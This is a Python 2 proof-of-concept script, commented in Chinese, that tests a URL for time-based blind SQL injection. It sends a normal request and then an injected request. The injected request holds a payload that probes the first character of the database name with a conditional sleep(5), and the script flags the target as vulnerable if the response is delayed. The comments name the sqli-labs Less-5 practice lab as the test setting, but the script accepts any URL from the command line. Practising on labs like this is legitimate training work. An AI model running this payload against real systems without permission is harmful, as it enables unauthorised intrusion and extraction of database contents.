#!/usr/bin/env python 
# -*- coding:utf-8 -*-
# 基于时间的盲注，通过计算两次不同请求的时间差来判断是否执行sql语句
# 测试环境是sqli-labs的第五关
import requests
import sys
import time

def verify(url):
    # url = "http://192.168.166.100:32768/Less-5/"
    # 正常请求 payload1
    payload1 = "?id=1"
    target1 = url + payload1
    # 延时请求 payload2
    payload2 = "?id=1' and If(ascii(substr(database(),1,1))>115,1,sleep(5)) --+"
    target2 = url + payload2

    try:
        # 记录正常请求的时间
        start_time1 = time.time()
        req1 = requests.get(target1)
        response1 = req1.text
        now_time1 = time.time() - start_time1
        print now_time1
        # 记录POC发送的时间
        start_time2 = time.time()
        req2 = requests.get(target2)
        response2 = req2.text
        now_time2 = time.time() - start_time2
        print now_time2
        # 判断响应时间
        now_time = now_time2 - now_time1
        print now_time
        if now_time > 4:
            print "%s is vulnerable" % target2
        else:
            print "%s is not vulnerable" % target2
    except Exception, e:
        print "Something happend...."
        print e

def main():
    args = sys.argv
    url = ""
    if len(args) == 2:
        url = args[1]
        verify(url)
    else:
        print "Usage: python %s url" % (args[0])

if __name__ == "__main__":
    main()

